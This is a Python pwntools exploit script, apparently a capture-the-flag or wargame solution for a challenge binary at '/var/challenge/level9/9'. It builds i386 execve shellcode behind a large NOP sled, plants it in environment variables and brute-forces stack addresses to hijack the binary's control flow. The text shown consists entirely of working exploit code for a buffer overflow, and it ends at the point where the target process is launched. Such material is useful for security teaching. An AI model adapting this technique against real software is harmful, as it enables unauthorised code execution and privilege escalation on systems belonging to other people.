from pwn import *
import os
from string import ascii_lowercase
from itertools import product

# Create shellcode.
f = '/var/challenge/level9/9'
sc = shellcraft.i386
shellcode = sc.linux.execve('/usr/local/bin/l33t')
shellcode = asm(sc.nop(), arch='i386') * 15000 + asm(shellcode, arch='i386')

# add shellcode to the environment
sc_loc = 0xffffdfb4
base_ptr = 0xf7fcaffc
# NOTE: Only uses 6 A's because 10 chars are 'BOVERFLOW='

# Generate an environment with tons of instances of overflow code.
keys = product(ascii_lowercase, repeat = 1)
keys = [''.join(key) for key in keys]
print 'Set %s environment variables for overflow' % len(keys)

# Brute force address range for possible locations of nop sled.
for i in range(0xfff10101, 0xffffffff, 0x1000):
	print '%s' % hex(i)
	# make sure this address doesn't include null bytes. if it does, continue. We are
	#	guaranteed to hit nops anyway.		
	if '\x00' in p32(i):
		continue
	environment = {}
	for key in keys:
		environment[key] = 'AA' + p32(i) * 10
	environment['SHELLCODE'] = shellcode	

	p = process(executable=f, argv=[], env=environment, alarm=6)